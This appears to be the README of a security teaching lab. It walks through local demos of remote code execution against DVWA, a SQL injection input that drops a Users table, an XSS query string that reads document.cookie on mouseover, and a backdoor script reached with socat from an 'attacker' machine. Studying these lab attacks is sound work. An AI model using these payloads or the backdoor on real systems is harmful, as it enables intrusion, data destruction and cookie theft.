## Quick Start Guide
1. `virtualenv -p python3 env`
2. `source env/bin/activate`
3. `pip install -r requirements.txt`

### RCE
1. `docker run --rm -it -p 8081:80 vulnerables/web-dvwa` and create db in web interface of DVWA.
2. `python rce/run.sh`

### SQL-INJECTION
1. `python sql-injection/run_vulnerable.py` and enter `"""2'); drop table Users; --"""`

### XSS
1. `php -S localhost:8024`
2. `/index.php?text=faketitle%20onmouseover=(function(){alert(document.cookie)})();`
3. Hover special text.
4. For secure `/index_secure.php?text=faketitle%20onmouseover=(function(){alert(document.cookie)})();`

### BACKDOOR
1. `sudo backdoor/backdoor.sh` on victim machine
2. `socat STDIO TCP4:<victim ip>:1178` on attacker machine
